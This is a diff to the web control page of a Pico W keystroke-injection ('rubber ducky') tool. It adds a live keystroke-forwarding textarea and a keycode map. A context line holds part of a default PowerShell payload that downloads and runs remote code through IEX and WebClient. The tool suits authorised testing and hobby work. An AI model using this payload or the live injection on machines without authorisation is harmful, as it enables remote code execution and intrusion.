@@ -13,6 +13,11 @@
 		<div class="normal-div">
 			<h3>send keystrokes:</h3>
 			<textarea type="text" id="keys-to-send" class="monospace"></textarea>
+			<div class="normal-div">
+				<h3>live textarea (any keys pressed here will be <u>immediantely</u> sent to the target):</h3>
+				<span>Enable live textarea <input type="checkbox" id="toggle-live"></span>
+				<textarea class="monospace" id="live-textarea"></textarea>
+			</div>
 		</div>
 		<div class="normal-div">
 			<h1>usage:</h1>
@@ -72,18 +77,16 @@
 			</ul>
 		</div>
 	</div>
-	<button onclick="submit()">submit</button>
+	<button onclick="submitPayload()">submit</button>
 	<button onclick="terminate()">terminate server</button>
-	<p>check the <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a> for usage info</p>
-	<div style="position: absolute; bottom: 0; left: 10px;">
-		<p style="font-size: 10px;">by TheSavageTeddy on <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a></p>
-	</div>
+	<p>check the <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a> for more usage info</p>
+	<p style="font-size: 10px;">by TheSavageTeddy on <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a></p>
 </body>
 
 <style>
 .x-center {
 	display: flex;
-	align-items: center;
+	align-items: flex;
 	justify-content: flex-start;
 }
 
@@ -97,22 +100,124 @@
 
 #keys-to-send {
 	width: 50vw;
-	height: 60vh;
+	height: 50vh;
+}
+
+#live-textarea{
+	width: 50vw;
+	height: 5vh;
 }
 
 </style>
 <script>
-function ascii_to_hex(str) {
+javascript_to_adafruit = {
+    8: 0x2A,   // Keycode.BACKSPACE
+    9: 0x2B,   // Keycode.TAB
+    13: 0x28,  // Keycode.ENTER
+    16: 0xE1,  // Keycode.LEFT_SHIFT
+    17: 0xE0,  // Keycode.LEFT_CONTROL
+    18: 0xE2,  // Keycode.LEFT_ALT
+    20: 0x39,  // Keycode.CAPS_LOCK
+    27: 0x29,  // Keycode.ESCAPE
+    32: 0x2C,  // Keycode.SPACEBAR
+    33: 0x4B,  // Keycode.PAGE_UP
+    34: 0x4E,  // Keycode.PAGE_DOWN
+    35: 0x4D,  // Keycode.END
+    36: 0x4A,  // Keycode.HOME
+    37: 0x50,  // Keycode.LEFT_ARROW
+    38: 0x52,  // Keycode.UP_ARROW
+    39: 0x4F,  // Keycode.RIGHT_ARROW
+    40: 0x51,  // Keycode.DOWN_ARROW
+    45: 0x49,  // Keycode.INSERT
+    46: 0x4C,  // Keycode.DELETE
+    48: 0x27,  // Keycode.ZERO
+    49: 0x1E,  // Keycode.ONE
+    50: 0x1F,  // Keycode.TWO
+    51: 0x20,  // Keycode.THREE
+    52: 0x21,  // Keycode.FOUR
+    53: 0x22,  // Keycode.FIVE
+    54: 0x23,  // Keycode.SIX
+    55: 0x24,  // Keycode.SEVEN
+    56: 0x25,  // Keycode.EIGHT
+    57: 0x26,  // Keycode.NINE
+    65: 0x04,  // Keycode.A
+    66: 0x05,  // Keycode.B
+    67: 0x06,  // Keycode.C
+    68: 0x07,  // Keycode.D
+    69: 0x08,  // Keycode.E
+    70: 0x09,  // Keycode.F
+    71: 0x0A,  // Keycode.G
+    72: 0x0B,  // Keycode.H
+    73: 0x0C,  // Keycode.I
+    74: 0x0D,  // Keycode.J
+    75: 0x0E,  // Keycode.K
+    76: 0x0F,  // Keycode.L
+    77: 0x10,  // Keycode.M
+    78: 0x11,  // Keycode.N
+    79: 0x12,  // Keycode.O
+    80: 0x13,  // Keycode.P
+    81: 0x14,  // Keycode.Q
+	82: 0x15, // Keycode.R
+	83: 0x16, // Keycode.S
+	84: 0x17, // Keycode.T
+	85: 0x18, // Keycode.U
+	86: 0x19, // Keycode.V
+	87: 0x1A, // Keycode.W
+	88: 0x1B, // Keycode.X
+	89: 0x1C, // Keycode.Y
+	90: 0x1D, // Keycode.Z
+	91: 0xE3, // Keycode.LEFT_GUI
+	92: 0xE7, // Keycode.RIGHT_GUI
+	93: 0x65, // Keycode.APPLICATION
+	96: 0x62, // Keycode.NUM_ZERO
+	97: 0x59, // Keycode.NUM_ONE
+	98: 0x5A, // Keycode.NUM_TWO
+	99: 0x5B, // Keycode.NUM_THREE
+	100: 0x5C, // Keycode.NUM_FOUR
+	101: 0x5D, // Keycode.NUM_FIVE
+	102: 0x5E, // Keycode.NUM_SIX
+	103: 0x5F, // Keycode.NUM_SEVEN
+	104: 0x60, // Keycode.NUM_EIGHT
+	105: 0x61, // Keycode.NUM_NINE
+	106: 0x55, // Keycode.NUM_MULTIPLY
+	107: 0x57, // Keycode.NUM_PLUS
+	109: 0x56, // Keycode.NUM_MINUS
+	110: 0x63, // Keycode.NUM_PERIOD
+	111: 0x54, // Keycode.NUM_DIVIDE
+	112: 0x30, // Keycode.F1
+	113: 0x31, // Keycode.F2
+	114: 0x32, // Keycode.F3
+	115: 0x33, // Keycode.F4
+	116: 0x34, // Keycode.F5
+	117: 0x35, // Keycode.F6
+	118: 0x36, // Keycode.F7
+	119: 0x37, // Keycode.F8
+	120: 0x38, // Keycode.F9
+	121: 0x39, // Keycode.F10
+	122: 0x3A, // Keycode.F11
+	123: 0x3B, // Keycode.F12
+	144: 0x53, // Keycode.NUM_LOCK
+	145: 0x47, // Keycode.SCROLL_LOCK
+	186: 0x33, // Keycode.SEMICOLON
+	187: 0x2E, // Keycode.EQUAL
+	188: 0x36, // Keycode.COMMA
+	189: 0x2D, // Keycode.MINUS
+	190: 0x37, // Keycode.PERIOD
+	191: 0x38, // Keycode.SLASH
+	192: 0x35, // Keycode.BACKTICK
+	219: 0x2F, // Keycode.LEFT_BRACKET
+	220: 0x31, // Keycode.BACKSLASH
+	221: 0x30, // Keycode.RIGHT_BRACKET
+	222: 0x34 // Keycode.SINGLE_QUOTE
+}
+
+function ascii_to_hex(str) { // TODO: replace this with btoa (base64), takes up less bytes in request url
 	var arr1 = [];
 	for(var n = 0, l = str.length; n < l; n++) {
 		var hex = Number(str.charCodeAt(n)).toString(16);
 		arr1.push(hex);
 	}
 	return arr1.join('');
-}
-
-function setStatus(text) {
-	document.getElementById("status").innerHTML = text
 }
 
 function terminate() {
@@ -125,8 +230,7 @@ function terminate() {
 	}) : null
 }
 
-function submit() {
-	
+function submitPayload() {
 	let input = document.getElementById("keys-to-send").value
 	let to_send = []
 	input = input.split("\n")
@@ -146,9 +250,38 @@ function submit() {
 		method: 'GET'
 	})
 }
+
+function submitKey(key, pressType){
+	let data = key.toString(16).padStart(2, '0');
+	let type = pressType === "keydown" ? "00" : "01"
+	fetch(`/sendsinglekey?key=${data}${type}`, { // TODO TEST THIS
+		method: 'GET'
+	})
+}
+
+function handleLiveKeypress(eventType, event){
+	if (document.getElementById("toggle-live").checked){
+		let adafruit_keycode = javascript_to_adafruit[event.keyCode]
+		if (eventType === "keydown"){
+			event.preventDefault();
+			submitKey(adafruit_keycode, "keydown")
+			liveTextarea.value += "\n" + `Key pressed:  ${event.key.padEnd(10)} keyCode: ${String(event.keyCode).padEnd(10)} adafruit keycode: ${adafruit_keycode}`
+			liveTextarea.scrollTop = liveTextarea.scrollHeight;
+		}else{
+			event.preventDefault();
+			submitKey(adafruit_keycode, "keyup")
+			liveTextarea.value += "\n" + `Key released: ${event.key.padEnd(10)} keyCode: ${String(event.keyCode).padEnd(10)} adafruit keycode: ${adafruit_keycode}`
+			liveTextarea.scrollTop = liveTextarea.scrollHeight;
+		}
+	}
+}
+
+var liveTextarea
 document.addEventListener("DOMContentLoaded", () => {
+	liveTextarea = document.getElementById("live-textarea") // TODO: do this for all things
 	
 	let savedPayload = localStorage.getItem('payload')
+	let liveToggle = localStorage.getItem('live-textarea-on')
 	if (savedPayload !== null) {
 		// use localstorage saved payload
 		document.getElementById("keys-to-send").innerHTML = savedPayload
@@ -179,12 +312,37 @@ IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubuserconte
 `
 	}
 
-})
+	if (liveToggle !== null){
+		document.getElementById("toggle-live").checked = liveToggle === "true" // scuffed
+	}
 
-document.getElementById("keys-to-send").addEventListener("input", ()=>{
+
+	// add event listeners
+
+	document.getElementById("keys-to-send").addEventListener("input", ()=>{
 	// save your payload to local storage to presist after reload
 	localStorage.setItem('payload', document.getElementById("keys-to-send").value);
+	})
+
+	document.getElementById("toggle-live").addEventListener("change", ()=>{
+		// save toggle live preferences
+		localStorage.setItem('live-textarea-on', document.getElementById("toggle-live").checked);
+	})
+
+	// listen to keys pressed in the live text box
+	liveTextarea.addEventListener('keydown', function(event) {
+		handleLiveKeypress("keydown", event)
+	});
+	liveTextarea.addEventListener('keyup', function(event) {
+		handleLiveKeypress("keyup", event)
+	});
+
+	
 })
+
+
+
+
 
 </script>
 
